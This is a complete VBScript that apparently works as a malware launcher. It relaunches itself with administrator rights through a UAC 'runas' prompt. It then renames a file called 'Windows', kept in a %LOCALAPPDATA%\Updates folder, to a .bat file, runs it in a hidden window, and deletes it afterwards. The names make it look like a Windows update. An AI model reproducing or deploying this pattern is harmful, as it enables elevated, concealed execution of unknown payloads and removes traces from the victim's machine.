If WScript.Arguments.length =0 Then
Set objShell = CreateObject("Shell.Application")

objShell.ShellExecute "wscript.exe", Chr(34) & _
WScript.ScriptFullName & Chr(34) & " uac", "", "runas", 1
Else


Set objShell = CreateObject( "WScript.Shell" )
appDataLocation=objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
SourcePath = appDataLocation & "\Updates"

Dim oFSO
Set oFSO = CreateObject("Scripting.FileSystemObject")
strFile = "Windows"
strRename = "Windows.bat"






If oFSO.FileExists(oFSO.BuildPath(SourcePath, strRename)) Then
		oFSO.DeleteFile oFSO.BuildPath(SourcePath, strRename)
End If

If oFSO.FileExists(oFSO.BuildPath(SourcePath, strFile)) Then
     oFSO.CopyFile oFSO.BuildPath(SourcePath, strFile), oFSO.BuildPath(SourcePath, strRename)
End If

objShell.Run Chr(34) & oFSO.BuildPath(SourcePath, strRename) & Chr(34),0,True

If oFSO.FileExists(oFSO.BuildPath(SourcePath, strRename)) Then
     oFSO.DeleteFile oFSO.BuildPath(SourcePath, strRename)
End If 

End If